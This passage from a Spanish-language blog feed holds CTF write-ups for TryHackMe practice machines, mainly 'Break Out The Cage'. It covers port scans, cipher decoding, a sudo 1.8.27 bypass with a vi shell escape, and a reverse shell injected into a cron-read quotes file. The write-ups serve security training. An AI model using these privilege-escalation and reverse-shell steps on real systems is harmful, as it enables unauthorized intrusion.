&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214051.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro, encontramos un archivo txt. Que al revisarlo encontramos que esta en el lenguaje brainfuck.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214259.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214454.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---eli&#34;&gt;USER - ELI&lt;/h2&gt;
&lt;p&gt;Utilizamos un &lt;a href=&#34;https://www.dcode.fr/brainfuck-language&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener en texto plano el mensaje, en donde encontramos unas credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214627.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales en el servicio SSH y obtenemos una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214814.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---gwendoline&#34;&gt;USER - GWENDOLINE&lt;/h2&gt;
&lt;p&gt;Al entrar a este servicio nos muestra un mensaje de root para Gwendoline.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_215221.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos el lugar &amp;ldquo;s3cr3t&amp;rdquo; y encontramos un archivo donde está la contraseña de Gwendoline.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_215403.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la contraseña para elevar a Gwendoline y obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_215726.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;vi&lt;/code&gt; en el archivo &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_215811.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizar el comando con sudo pero no nos permitió.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_220452.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos la version de sudo, buscamos un exploit/vulnerabilidad relacionado y vemos &lt;a href=&#34;https://www.exploit-db.com/exploits/47502&#34;&gt;&lt;em&gt;sudo 1.8.27 - Security Bypass&lt;/em&gt;&lt;/a&gt;, intentamos utilizar este &amp;ldquo;exploit&amp;rdquo;, logramos ejecutar &lt;code&gt;vi&lt;/code&gt; con sudo, obtener una shell root utilizando &lt;code&gt;:!sh&lt;/code&gt; en vi y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_221008.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/yearoftherabbit/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/yearoftherabbit/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Break Out The Cage</title>
        <link>https://sckull.github.io/posts/breakthecage/</link>
        <pubDate>Sat, 27 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/breakthecage/</guid>
        <description>Break Out The Cage es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.</description>
        <content:encoded>&lt;p&gt;Break Out The Cage es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Break Out The Cage&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Break Out The Cage&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Help Cage bring back his acting career and investigate the nefarious goings on of his agent!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;240&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Magna&#34;&gt;Magna&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 22:24:17 2020 as: nmap -sV -o nmap_scan_mini breakthecage.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; breakthecage.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.25&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 22:25:00 2020 -- 1 IP address (1 host up) scanned in 43.71 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 22:24:15 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan breakthecage.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; breakthecage.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.25&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;396&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 23:33 dad_tasks
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   STAT: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FTP server status:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Connected to ::ffff:10.8.6.160
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Logged in as ftp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      TYPE: ASCII
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      No session bandwidth limit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Control connection is plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Data connections will be plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      At session startup, client count was &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      vsFTPd 3.0.3 - secure, fast, stable
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 22:50:38 2020 -- 1 IP address (1 host up) scanned in 1582.44 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_212632.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/breakoutthecage# gobuster dir -u http://breakthecage.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; -x php,html,txt
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/scripts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contracts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/auditions &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un directorio en donde hay un archivo mp3.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_214502.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;Sonic Visualiser&lt;/code&gt; para verificar que el archivo no tenga algo dentro agregando una capa de espectrograma. Logramos ver una palabra que seguramente nos servira. &lt;em&gt;Puede que alguna de las letras sea engañosa, &lt;code&gt;audacity&lt;/code&gt; tambien trae la opcion de agregar una capa de espectrograma.&lt;/em&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220332.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp---task-1&#34;&gt;FTP - &lt;em&gt;Task 1&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Nos conectamos al servicio FTP con las credenciales de anonymous:anonymous y encontramos un archivo que esta codificado en base64.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220508.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;CyberChef&lt;/code&gt; para decodificar el mensaje, al realizar esto vemos el mensaje &amp;ldquo;descompuesto&amp;rdquo;. Utilizamos &lt;code&gt;Vigenere Cipher&lt;/code&gt; con la palabra que encontramos para obtener el mensaje real. &lt;em&gt;Task 1&lt;/em&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220704.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---weston---cage&#34;&gt;USER - WESTON -&amp;gt; CAGE&lt;/h2&gt;
&lt;p&gt;Ahora que encontramos la contraseña de weston iniciamos sesion en el servicio ssh. Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;/usr/bin/bees&lt;/code&gt;. El archivo contiene un comando, pero este no puede ser editado por el usuario actual.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_221307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;pspy64&lt;/code&gt; para ver si existe algun cronjob en la maquina, esto porque durante la enumeracion de los archivos se imprimia un mensaje diferente en pantalla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_221929.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un archivo que se ejecuta y se encuentra en el directorio &lt;code&gt;/opt/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222245.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo del script en python lee el archivo &lt;code&gt;.quotes&lt;/code&gt; en el que hay una larga lista de frases, elige una aleatoria, la imprime mediante el comando &lt;code&gt;wall&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222425.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder tomar ventaja de este script deberia de quedar de la siguiente forma para poder ejecutar comandos y una posible shell inversa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222740.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Renombramos el archivo &lt;code&gt;.quotes&lt;/code&gt;, creamos uno nuevo con una frase y nuestra shell inversa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ponemos a la escucha netcat en nuestra maquina, esperamos, y logramos obtener una shell con el usuario cage.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223705.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223835.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;En la carpeta principal de &lt;em&gt;cage&lt;/em&gt; encontramos el archivo &lt;code&gt;id_rsa&lt;/code&gt; que nos da acceso a una shell en el servicio ssh. En la carpeta &lt;code&gt;email_backup&lt;/code&gt; encontramos varios correos en tres archivos. En uno de ellos hablan sobre una nota y lo que esta decia.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_224722.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizarla como contraseña del usuario root pero no funcionó, por lo que utilizamos nuevamente &lt;code&gt;vignere cipher&lt;/code&gt; pero esta vez no teniamos la clave y utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; ya que nos muestra una lista de posibles claves y su resultado. Logramos encontrar su clave y el mensaje real.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_224915.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el mensaje real como contraseña del usuario root y logramos obtener acceso con este usuario, además encontramos nuevamente un backup de correos en su carpeta principal y en uno de ellos nuestra flag *&lt;em&gt;root.txt&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_225002.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/breakthecage/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/breakthecage/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Lian_Yu</title>
        <link>https://sckull.github.io/posts/lianyu/</link>
        <pubDate>Sat, 27 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lianyu/</guid>
        <description>Lian_Yu es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Lian_Yu es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Lian_Yu&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Lian_Yu&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A beginner level security challenge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;180&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Deamon&#34;&gt;Deamon&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), 80 (http) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
